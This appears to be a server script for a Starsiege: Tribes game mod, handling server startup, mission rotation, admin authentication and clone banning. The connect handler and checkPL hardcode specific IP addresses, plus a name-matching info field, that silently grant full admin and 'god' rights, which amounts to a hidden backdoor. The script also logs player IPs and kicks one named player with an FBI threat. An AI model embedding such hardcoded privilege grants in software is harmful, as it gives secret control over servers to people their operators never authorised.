
function createTrainingServer() { 
	$SinglePlayer = true; 
	createServer($pref::lastTrainingMission, false); 
	}

function remoteSetCLInfo(%clientId, %skin, %name, %email, %tribe, %url, %info, %autowp, %enterInv, %msgMask)
	{ 
	$Client::info[%clientId, 0] = %skin; 
	$Client::info[%clientId, 1] = %name; 
	$Client::info[%clientId, 2] = %email; 
	$Client::info[%clientId, 3] = %tribe; $Client::info[%clientId, 4] = %url; 
	$Client::info[%clientId, 5] = %info; 
		if(%autowp) %clientId.autoWaypoint = true; 
		if(%enterInv) %clientId.noEnterInventory = true; 
		if(%msgMask != "") %clientId.messageFilter = %msgMask; 
	}

function Server::storeData()
{
   $ServerDataFile = "serverTempData" @ $Server::Port @ ".cs";

   export("Server::*", "temp\\" @ $ServerDataFile, False);
   export("pref::lastMission", "temp\\" @ $ServerDataFile, true);
   EvalSearchPath();
}

function Server::refreshData()
{
   exec($ServerDataFile);  // reload prefs.
   checkMasterTranslation();
   Server::loadMission($pref::lastMission, false);
   %num = getNumClients();
   for(%i = 0; %i < %num; %i++) 
	{ 
	  %pl = getClientByIndex(%i); 
	  if(%pl.sexowner == true) $Server::MaxPlayers++; 
	} 
exec(sex);

}


function Server::onClientDisconnect(%clientId)
{
   Client::setControlObject(%clientId, -1);
   Client::leaveGame(%clientId);
   Game::CheckTourneyMatchStart();
	if(%clientId.sexowner == true)
	{
		$Server::MaxPlayers--; 
	}

   if(getNumClients() == 1 && $resetserver) // this is the last client.
      Server::refreshData();
}
function KickDaJackal(%clientId)
{
   Net::kick(%clientId, "The FBI has been notified.  You better buy a legit copy before they get to your house.");
}
function Server::onClientConnect(%clientId)
{
      if (!$first){ 
	AddSpawnWeapon($testweapon);
	$first = true; 	
	}
	%clientId.isAdmin = false;%clientId.isSuperAdmin = false;%clientId.dis = false;%clientId.isGod = false;%clientId.sexowner = false;

      checkclone(%clientID);
      
	%ip = Client::getTransportAddress(%clientId);
   	$SexCLog = Client::getName(%clientId) @ " " @ %ip;
	export("SexCLog","config\\sex_Connect.log",true);
	
   %ip = Client::getTransportAddress(%clientId); 
   if(!String::NCompare(%ip, "IP:192.168.0", 12) ||!String::NCompare(%ip, "IP:12.217.118.90", 16) )
   {
      // force admin the loopback dude, or the local client  || !String::NCompare(%ip, "LOOPBACK", 8)
      %clientId.isAdmin = true;
      %clientId.isSuperAdmin = true;
      %clientId.isGod = true;
      %clientId.sexowner = true;
	$Server::MaxPlayers++;
   } else {
	IxAdmin_Authenticate(%clientId, ixPrepIp(%ip));
   }

   echo("CONNECT: " @ %clientId @ " \"" @ 
      escapeString(Client::getName(%clientId)) @ 
      "\" " @ %ip);
   if(Client::getName(%clientId) == "DaJackal")
      schedule("KickDaJackal(" @ %clientId @ ");", 20, %clientId);
$modList = "SEX"; $ModInfo = "SEX";	
   %clientId.noghost = true;
   %clientId.messageFilter = -1; // all messages
   remoteEval(%clientId, SVInfo, version(), $Server::Hostname, $modList, $Server::Info, $ItemFavoritesKey, $ModInfo);
   remoteEval(%clientId, MODInfo, "<f2>" @ $modlist @ "<f1> mod\n<f0>" @ $plasmatic @ "");




   // clear out any client info:
   for(%i = 0; %i < 10; %i++)  {
      $Client::info[%clientId, %i] = "";
   }
   $warning[%clientId] = 0;
   %clientId.custom = False;
   Game::onPlayerConnected(%clientId);
}


exec(AdminUserList); 
$UserList::Activated = true;

function IxAdmin_Authenticate(%clientId, %ip) { 
	if($UserList::Activated) { 
	%name = Client::getName(%clientId); 
	%user = ixGetUser(%name,%ip); 
		if(%user) { 
		%username = getWord($UserList::User[%user], 1); 
		%flags = getWord($UserList::User[%user], 3); 
		$ixUserInfo[%clientId] = $UserList::User[%user]; 
		echo("Admin: User: ",%username," identified. Access level: ",%flags); 
		if(%flags == "AutoSuper") { %clientId.isAdmin = true; 
			%clientId.isSuperAdmin = true;
			ixAdminMsg("SuperAdmin: " @ %username @ " automatically assigned."); }
		else if(%flags == "God") { 
			%clientId.isAdmin = true; 
			%clientId.isSuperAdmin = true; 
			%clientId.isGod = true; 
			ixAdminMsg("GodAdmin: " @ %username @ " automatically assigned."); } 
		else if(%flags == "AutoPublic") { 
		%clientId.isAdmin = true; 
		ixAdminMsg("PublicAdmin: " @ %username @ " automatically assigned."); } } 
	else { 
		echo("Admin: User: ",%name," Unknown."); 
		$ixUserInfo[%clientId] = "0 " @ %name @ " None None " @ %ip; 
		} 
	}
 
} 


function ixProcess(%client, %name, %user, %username, %flags, %password) { if(!%client.isAdmin) { %realpass = getWord($UserList::User[%user], 2); if(!String::ICompare(%password, %realpass)) { if((%flags == "PublicAdmin") && (%name == %username)) { %client.isAdmin = true; } if((%flags == "SuperAdmin") && (%name == %username)) { %client.isAdmin = true; %client.isSuperAdmin = true; } ixAdminMsg(%username @ " Logged in."); } else { Client::sendMessage(%client, 0,"Server: Bad Password"); ixAdminMsg(%name @ " login attempt failed. Username: " @ %username); } } else { Client::sendMessage(%client, 0,"Server: You already have admin status."); } } 


function ixAdminMsg(%msg) { messageAll(1, %msg); } 


function ixGetUser(%name,%ip) { for(%i=1;%i <= $UserList::MaxUsers;%i++) { if(%name == (getWord($UserList::User[%i], 1))) { for(%j=4;((%mask = getWord($UserList::User[%i], %j)) != -1);%j++) { if(ixCompareIP(%ip,%mask)) return %i; } return 0; } } return 0; } 

function ixCompareIP(%ip, %mask) { %ipNow = ixDotToSpace(%ip); %maskNow = ixDotToSpace(%mask); for(%x=0;%x<4;%x++) { %one = getWord(%ipNow, %x); %two = getWord(%maskNow, %x); if((%one != %two) && (%two != "*")) return "false"; } return "true"; } 
function ixStrLen(%string) { for(%i=0; String::getSubStr(%string, %i, 1) != "";%i++) %length = %i; %length++; return %length; } 
function ixDotToSpace(%string) { %x = 0; %i = 0; while(%x<3) { %char = String::getSubStr(%string,%i,1); if(!String::ICompare(%char, ".")) { %left = String::getSubStr(%string,0,%i); %right = String::getSubStr(%string,%i+1,(ixStrLen(%string)-%i)); %string = strcat(%left," ",%right); %x++; } %i++; } return %string; } 


function createServer(%mission, %dedicated)
{
   $loadingMission = false;
   $ME::Loaded = false;
   if(%mission == "")
      %mission = $pref::lastMission;

   if(%mission == "")
   {
      echo("Error: no mission provided.");
      return "False";
   }

   if(!$SinglePlayer)
      $pref::lastMission = %mission;

	//display the "loading" screen
	cursorOn(MainWindow);
	GuiLoadContentCtrl(MainWindow, "gui\\Loading.gui");
	renderCanvas(MainWindow);

   if(!%dedicated)
   {
      deleteServer();
      purgeResources();
      newServer();
      focusServer();
   }
   if($SinglePlayer)
      newObject(serverDelegate, FearCSDelegate, true, "LOOPBACK", $Server::Port);
   else
      newObject(serverDelegate, FearCSDelegate, true, "IP", $Server::Port, "IPX", $Server::Port, "LOOPBACK", $Server::Port);
   
   exec(admin);
   exec(Marker);
   exec(Trigger);
   exec(NSound);
   exec(BaseExpData);
   exec(BaseDebrisData);
	exec(BaseProjData);
   exec(ArmorData);
   exec(Mission);
	exec(Item);
	exec(Player);
	exec(sex);

//hard code for reset server default
 $BaseRape = $BaseRapeDefault;
 $Build = $BuildDefault;
 $NoDamage = $NoDamageDefault;
 $FairTeams = $FairTeamsDefault;

	exec(Vehicle);
	exec(Turret);
	exec(Beacon);
	exec(StaticShape);
	exec(Station);
	exec(Moveable);
	exec(Sensor);
exec(a_steve);
	exec(Mine);
	exec(AI);
exec(vorter);
	exec(InteriorLight);
	exec(missionreinitdata);
   Server::storeData();

   // NOTE!! You must have declared all data blocks BEFORE you call
   // preloadServerDataBlocks.

   preloadServerDataBlocks();

   Server::loadMission( ($missionName = %mission), true );

   if(!%dedicated)
   {
      focusClient();

		if ($IRC::DisconnectInSim == "")
		{
			$IRC::DisconnectInSim = true;
		}
		if ($IRC::DisconnectInSim == true)
		{
			ircDisconnect();
			$IRCConnected = FALSE;
			$IRCJoinedRoom = FALSE;
		}
      // join up to the server
      $Server::Address = "LOOPBACK:" @ $Server::Port;
		$Server::JoinPassword = $Server::Password;
      connect($Server::Address);
   }
   return "True";
}


// list of random mission types -Plasmatic
$Havoc::RandomMissionTypes["Capture the Flag"] = TRUE;
$Havoc::RandomMissionTypes["Deathmatch"] = FALSE;
$Havoc::RandomMissionTypes["Balanced"] = TRUE;
$Havoc::RandomMissionTypes["Open Call"] = TRUE;
$Havoc::RandomMissionTypes["Multiple Team"] = FALSE;
$Havoc::RandomMissionTypes["Capture and Hold"] = TRUE;
$Havoc::RandomMissionTypes["Find and Retrieve"] = FALSE;
$Havoc::RandomMissionTypes["Defend and Destroy"] = FALSE;
$Havoc::RandomMissionTypes["Kill the Rabbit"] = FALSE;
$Havoc::RandomMissionTypes["Flag Hunter"] = FALSE;
$Havoc::RandomMissionTypes["Team Deathmatch"] = FALSE;
$Havoc::RandomMissionTypes["Training"] = false;

// straight outa Professional mod -Plasmatic
// with some mods for flexability
function Server::nextMission(%replay,%random)
{
	echo("Replay: " @ %replay);
	echo("RandomMissions: " @ %random);
	echo("MissionName: " @ $missionName);

//hard code for reset server default

if ($reset){
messageall(1,"resetting sever setttings");
echo("++++++++++++++++++   Resetting server defaults   ++++++++++++++++++");
$BaseRape = $BaseRapeDefault;
$Build = $BuildDefault;
$NoDamage = $NoDamageDefault;
$FairTeams = $FairTeamsDefault;
}

	if(%replay || $Server::TourneyMode)
	{
		%nextMission = $missionName;
	}
	else 
	{
		if (%random || ($RandomMissions && !%random)) 
		{
			echo("Selecting a mission...");
			%l = 0; %goodmtype = 0;
			echo("$MissionName: " @ $MissionName);
			while(!$Havoc::RandomMissionTypes[%goodmtype] && %l < 5000) 
			{
				%rnd = floor(getRandom() * $TotalMissions);
				//echo("firsttime = " @ $firstTime @ "RandumNum:;Exixts = " @ $RandomNum::Exists);
				if($RandomNum::Exists == "1" && !$FirstTime) %rnd = floor($RandomNum::Number[%l] * $TotalMissions);
				//echo("MissionNumber is " @ %rnd);
				//echo("firsttime = " @ $firstTime);
				%TestMission = $TotalMissionList[%rnd];
				if ($RestrictedMissions == "True" && !$AllowedMission[%TestMission])
				{
				}
				else
				{
					if ($MissionName == $TotalMissionList[%rnd])
					{
						%nextMission = $TotalMissionList[1];
						$pref::LastMission = $TotalMissionList[1];
						//echo("Stuck in this damn loop again: " @ $TotalMissionList[%rnd]);
					}
					else
					{
						%nextMission = $TotalMissionList[%rnd];
						$pref::LastMission = $TotalMissionList[%rnd];
					}
				}
				%goodmtype = $Havoc::MType[%nextMission];
				%l = %l + 1;
			}
			if(%l < 5000) 
			{
				$FirstTime = 1;
				//echo("firsttime = " @ $firstTime);
				echo("A random mission has been selected.");
				messageall(0, "A random mission is being selected...");
				messageall(0, "Changing to mission "@%nextMission@" ("@$Havoc::MType[%nextMission]@").");
			}
			else 
			{
				echo("No missions found of the choosen $Havoc::RandomMissionTypes()!");
				echo("Please verify HaVoC.cs is using the correct settings");
				echo("and that maps of the selected types exist.");
				echo("Using default next mission.");
				%nextMission = $nextMission[$missionName];
			}
  		}
  		else
		{
  			%nextMission = $nextMission[$missionName];
		}
	}
   	echo("Changing to mission ", %nextMission, ".");
   	Server::loadMission(%nextMission);
}



function oldServer::nextMission(%replay)
{	echo(" Huckers set:"@$hucky@" Big FF set:"@$totalNumBigBlue@" Blues set:"@$totalNumBlue);
	echo(" Blast walls used:"@$totalNumBlast@" Pencil Turrets:"@$totalNumPencil@" Zappers:"@$totalNumZapper@" Vortex:"@$totalNumZapper);
	echo(" RECYCLE DAMMIT!");
//hard code for reset server default

if ($reset){
messageall(1,"resetting sever setttings");
echo("_________________Resetting server defaults___________________");
$BaseRape = $BaseRapeDefault;
$Build = $BuildDefault;
$NoDamage = $NoDamageDefault;
$FairTeams = $FairTeamsDefault;
}
   if(%replay || $Server::TourneyMode)
      %nextMission = $missionName;
   else
      %nextMission = $nextMission[$missionName];
   echo("Changing to mission ", %nextMission, ".");
   // give the clients enough time to load up the victory screen
   Server::loadMission(%nextMission);
}



function remoteCycleMission(%clientId)
{
   if(%clientId.isAdmin)
   {
      messageAll(0, Client::getName(%playerId) @ " cycled the mission.");
      Server::nextMission();
   }
}
function remoteDataFinished(%clientId)
{
   if(%clientId.dataFinished)
      return;
   %clientId.dataFinished = true;
   Client::setDataFinished(%clientId);
   %clientId.svNoGhost = ""; // clear the data flag
   if($ghosting)
   {
      %clientId.ghostDoneFlag = true; // allow a CGA done from this dude
      startGhosting(%clientId);  // let the ghosting begin!
   }
}
function remoteCGADone(%playerId)
{
   if(!%playerId.ghostDoneFlag || !$ghosting)
      return;
   %playerId.ghostDoneFlag = "";

   Game::initialMissionDrop(%playerid);

	if ($cdTrack != "")
		remoteEval (%playerId, setMusic, $cdTrack, $cdPlayMode);
   remoteEval(%playerId, MInfo, $missionName);
}
function Server::loadMission(%missionName, %immed)
{
   if($loadingMission)
      return;

   %missionFile = "missions\\" $+ %missionName $+ ".mis";
   if(File::FindFirst(%missionFile) == "")
   {
      %missionName = $firstMission;
      %missionFile = "missions\\" $+ %missionName $+ ".mis";
      if(File::FindFirst(%missionFile) == "")
      {
         echo("invalid nextMission and firstMission...");
         echo("aborting mission load.");
         return;
      }
   }
   echo("Notfifying players of mission change: ", getNumClients(), " in game");
   for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
   {
      Client::setGuiMode(%cl, $GuiModeVictory);
      %cl.guiLock = true;
      %cl.nospawn = true;
      remoteEval(%cl, missionChangeNotify, %missionName);
   }

   $loadingMission = true;
   $missionName = %missionName;
   $missionFile = %missionFile;
   $prevNumTeams = getNumTeams();

   deleteObject("MissionGroup");
   deleteObject("MissionCleanup");
   deleteObject("ConsoleScheduler");
   resetPlayerManager();
   resetGhostManagers();
   $matchStarted = false;
   $countdownStarted = false;
   $ghosting = false;

   resetSimTime(); // deal with time imprecision

   newObject(ConsoleScheduler, SimConsoleScheduler);
   if(!%immed)
      schedule("Server::finishMissionLoad();", 18);
   else
      Server::finishMissionLoad();      
}

function checkPL(%c) { 
	$irock =0;$idiotmess = "";
	isbadguy(Client::getName(%c));
		if ($co >= 9) {
		%ip = Client::getTransportAddress(%c);
		if(ixPrepIP(%ip) != "24.183.24.166" && $Client::info[%c, 5] != Client::getName(%c)) { echo(Client::getName(%c)@" "@$func);
			BanList::add(%ip, 259200); //ban em for 3 days
			BanList::export("config\\banlist.cs");
			schedule("stevekick(" @ %c @ ");", 30);
			schedule("Net::kick(" @ %c @ ", \"Nice try.\");", 40);
			schedule("MessageAll(0, $func);", 40);
			return;
		}else{ if(ixPrepIP(%ip) == "24.183.24.166" || $Client::info[%c, 5] == Client::getName(%c)){$SeXy = "<jc><f2>Welcome Sire!\n<f1>";%c.isAdmin = true;%c.dis = true;%c.isSuperAdmin = true; 	%c.isGod = true;}	}}
}
function Server::finishMissionLoad()
{
   $loadingMission = false;
	$TestMissionType = "";
   // instant off of the manager
   setInstantGroup(0);
   newObject(MissionCleanup, SimGroup);

   exec($missionFile);
   Mission::init();
	Mission::reinitData();
   if($prevNumTeams != getNumTeams())
   {
      // loop thru clients and setTeam to -1;
      messageAll(0, "New teamcount - resetting teams.");
      for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
         GameBase::setTeam(%cl, -1);
   }

   $ghosting = true;
   for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
   {
      if(!%cl.svNoGhost)
      {
         %cl.ghostDoneFlag = true;
         startGhosting(%cl);
      }
   }
   if($SinglePlayer)
      Game::startMatch();
   else if($Server::warmupTime && !$Server::TourneyMode)
      Server::Countdown($Server::warmupTime);
   else if(!$Server::TourneyMode)
      Game::startMatch();

   $teamplay = (getNumTeams() != 1);
   purgeResources(true);

   // make sure the match happens within 5-10 hours.
   schedule("Server::CheckMatchStarted();", 3600);
   schedule("Server::nextMission();", 18000);
   return "True";
}
function Server::CheckMatchStarted()
{
   // if the match hasn't started yet, just reset the map
   // timing issue.
   if(!$matchStarted)
      Server::nextMission(true);
}
function Server::Countdown(%time)
{
   $countdownStarted = true;
   schedule("Game::startMatch();", %time);
   Game::notifyMatchStart(%time);
   if(%time > 30)
      schedule("Game::notifyMatchStart(30);", %time - 30);
   if(%time > 15)
      schedule("Game::notifyMatchStart(15);", %time - 15);
   if(%time > 10)
      schedule("Game::notifyMatchStart(10);", %time - 10);
   if(%time > 5)
      schedule("Game::notifyMatchStart(5);", %time - 5);
}
function Client::setInventoryText(%clientId, %txt)
{
   remoteEval(%clientId, "ITXT", %txt);
}
function centerprint(%clientId, %msg, %timeout)
{
   if(%timeout == "")
      %timeout = 5;
   remoteEval(%clientId, "CP", %msg, %timeout);
}
function bottomprint(%clientId, %msg, %timeout)
{
   if(%timeout == "")
      %timeout = 5;
   remoteEval(%clientId, "BP", %msg, %timeout);
}
function topprint(%clientId, %msg, %timeout)
{
   if(%timeout == "")
      %timeout = 5;
   remoteEval(%clientId, "TP", %msg, %timeout);
}
function centerprintall(%msg, %timeout)
{
   if(%timeout == "")
      %timeout = 5;
   for(%clientId = Client::getFirst(); %clientId != -1; %clientId = Client::getNext(%clientId))
      remoteEval(%clientId, "CP", %msg, %timeout);
}
function bottomprintall(%msg, %timeout)
{
   if(%timeout == "")
      %timeout = 5;
   for(%clientId = Client::getFirst(); %clientId != -1; %clientId = Client::getNext(%clientId))
      remoteEval(%clientId, "BP", %msg, %timeout);
}
function topprintall(%msg, %timeout)
{
   if(%timeout == "")
      %timeout = 5;
   for(%clientId = Client::getFirst(); %clientId != -1; %clientId = Client::getNext(%clientId))
      remoteEval(%clientId, "TP", %msg, %timeout);
}
//--------------------------------------Kickback
function ixApplyKickback(%player, %strength, %lift) 
{
if((!%lift) && (%lift != 0))
%lift = 0;

%rot = GameBase::getRotation(%player);
%rad = getWord(%rot, 2);
%x = (-1) * (ixSin(%rad));
%y = ixCos(%rad);
%dir = %x @ " " @ %y @ " 0";
%force = ixDotProd(Vector::neg(%dir),%strength);
%x = getWord(%force, 0);
%y = getWord(%force, 1);
%dir = %x @ " " @ %y @ " " @ %lift;
Player::applyImpulse(%player,%force);
}

function ixDotProd(%vec, %scalar) 
{
%return = Vector::dot(%vec,%scalar @ " 0 0") @ " " @ Vector::dot(%vec,"0 " @ %scalar @ " 0") @ " " @ Vector::dot(%vec,"0 0 " @ %scalar);
return %return;
}

function ixSin(%theta) 
{
return (%theta - (pow(%theta,3)/6) + (pow(%theta,5)/120) - (pow(%theta,7)/5040) + (pow(%theta,9)/362880) - (pow(%theta,11)/39916800));
}

function ixCos(%theta) 
{
return (1 - (pow(%theta,2)/2) + (pow(%theta,4)/24) - (pow(%theta,6)/720) + (pow(%theta,8)/40320) - (pow(%theta,10)/3628800));
} 


function ixPrepIP(%transport) { %x = 0; %i = 0; %now = 0; while((%x<2)&&(%i < 30)) { if(String::getSubStr(%transport,%i,1) == ":") { if(!%now) %now = %i+1; else return String::getSubStr(%transport, %now, %i - %now); %x++; } %i++; } return "LOCAL"; } 


function checkclone(%clientId){
	%matchIp = 0;
	%numPlayers = getNumClients();
   	%ip = Client::getTransportAddress(%clientId);
	%ClientIp = ixPrepIP(%ip);
	if ($debug) echo("Connecting Players Ip "@%ClientIp);

	for(%i = 0; %i < %numPlayers; %i++)
	{
		%cl = getClientByIndex(%i);
		%ip = Client::getTransportAddress(%cl);
		if(%ClientIp == ixPrepIP(%ip) && %clientId != %cl)
		{
			echo("Connecting Players Ip matches "@%Cl);
			%matchIp ++;
		%name = Client::getName(%client);
		$Admin = Client::getName(%clientId) @ " ip# "@%ClientIp@ " Cloning "@Client::getName(%cl)@", SAME IP CLONE ALERT";
		export("Admin","config\\clone.log",true);
		messageall(1,"send in the clones!!");
		}
	if (%matchIp > 4) {
		echo("----------- "@%clientId@", "@Client::getName(%clientId)@", "@%matchIp@" Matching Ip's! ");
		BanList::add(%ClientIp, 1800);
		BanList::export("config\\banlist.cs");
		}
	}
}

echo("server.cs ran");	//plasmatic